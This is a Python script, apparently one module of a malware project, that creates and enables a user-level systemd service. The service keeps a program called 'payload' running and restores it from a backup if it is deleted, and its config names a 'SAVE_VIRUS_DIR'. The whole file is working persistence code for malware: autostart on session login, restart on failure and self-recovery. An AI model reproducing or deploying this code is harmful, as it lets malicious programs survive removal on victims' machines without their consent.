""""
@author: Vuong Van Duy

setup_systemd.py
data: 14.10.2025

This script creates and installs a systemd unit file that ensures a specified payload program
is always running. If the payload is missing, it attempts to restore it from a backup location.
The unit is configured to start after the graphical session is available and will restart on failure.
"""

import os
import subprocess
import textwrap
import hashlib
from typing import Optional
from config import UNIT_NAME, UNIT_DIR, SAVE_VIRUS_DIR, BACKUP_DIR, LIST_NEW_FILES


def create_unit_content(progFileName: str = "payload", progFileBackup: str = "payload.bak") -> Optional[str]:
    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
    backupDir = os.path.expanduser(BACKUP_DIR)

    unit_content = textwrap.dedent(f"""\
    [Unit]
    Description=Start payload program (self-recovery if lost)
    After=graphical-session.target

    [Service]
    Type=simple

    Environment=PROG={dirSaveVirus}/{progFileName}
    Environment=BACKUP={backupDir}/{progFileBackup}

    WorkingDirectory=%h

    ExecStartPre=/bin/sh -c '[ -x "$PROG" ] || {{ [ -f "$BACKUP" ] && cp "$BACKUP" "$PROG" && chmod +x "$PROG"; :; }}'
    ExecStart=/bin/sh -c '[ -x "$PROG" ] && exec "$PROG" || {{ echo "No payload or backup available, skipping"; exit 0; }}'

    Restart=on-failure
    RestartSec=3
    RemainAfterExit=no

    [Install]
    WantedBy=default.target
""")
    return unit_content

def check_sum_unit_content(unit_content: str) -> str:
    h = hashlib.md5()
    h.update(unit_content.encode('utf-8'))
    return h.hexdigest()

def install_systemd_service(unit_content: str) -> bool:
    unit_dir = os.path.expanduser(UNIT_DIR)

    unit_path = os.path.join(unit_dir, UNIT_NAME)

    # Check if the file exists and the content has not changed then do nothing
    if os.path.exists(unit_path):
        with open(unit_path, 'r', encoding='utf-8') as f:
            existing_content = f.read()
        if check_sum_unit_content(existing_content) == check_sum_unit_content(unit_content):
            print("Unit file already exists and is up to date.")
            return True
    try:
        # Write unit file
        print(f"Creating unit file: {unit_path}")
        with open(unit_path, 'w', encoding='utf-8') as f:
            f.write(unit_content)

        # Set file permissions
        os.chmod(unit_path, 0o644)

        LIST_NEW_FILES.append(unit_path)

        # Reload systemd
        print("Realoading systemd...")
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)

        print("Enable service...")
        subprocess.run(["systemctl", "--user", "enable", UNIT_NAME], check=True)

        return True

    except subprocess.CalledProcessError as e:
        print(f"Error running systemd command: {e}")
        return False
    except Exception as e:
        print(f"Unknown error: {e}")
        return False
